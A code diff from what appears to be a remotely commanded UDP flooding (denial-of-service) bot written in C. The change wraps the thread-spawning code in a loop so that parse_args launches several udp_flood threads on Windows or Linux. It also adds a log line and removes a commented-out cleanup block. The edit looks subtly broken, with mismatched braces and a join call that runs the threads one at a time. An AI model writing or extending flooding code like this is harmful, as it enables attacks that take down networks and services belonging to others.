@@ -214,37 +214,31 @@ int parse_args (SOCKET s, pMessage m) {
     }
 
     // thread flood routine
+    for (i = 0; i < ta->threads; i++) {
 #if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
 
-    // CreateThread goes here
-    DWORD thr_id;
-    HANDLE hThr;
-    hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)&udp_flood, ta, 0, &thr_id);
-    if (hThr == NULL) {
-        fatal ("Thread flooder");
+        // CreateThread goes here
+        DWORD thr_id;
+        HANDLE hThr;
+        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)&udp_flood, ta, 0, &thr_id);
+        if (hThr == NULL) {
+            fatal ("Thread flooder");
     }
 
 #elif defined(__linux__)
 
-    pthread_t thr;
-    if (pthread_create (&thr, NULL, udp_flood, ta)) {
-        fatal ("Thread flooder");
-    }
-    if (pthread_join (thr, NULL)) {
-        fatal ("Join thread flooder");
-    }
+        pthread_t thr;
+        if (pthread_create (&thr, NULL, udp_flood, ta)) {
+            fatal ("Thread flooder");
+        }
+        if (pthread_join (thr, NULL)) {
+            fatal ("Join thread flooder");
+        }
 
 #endif
-
-    // there is an error here somewhere!!!
-    /*
-    // free argv malloc
-    for (; i > 0; i--) {
-        if (argv[i] != NULL) {
-            free (argv[i]);
-        }
+        printf ("Spawned thread [%d]\n", i);
     }
-    */
+
     free (argv);
     free (ta);
 
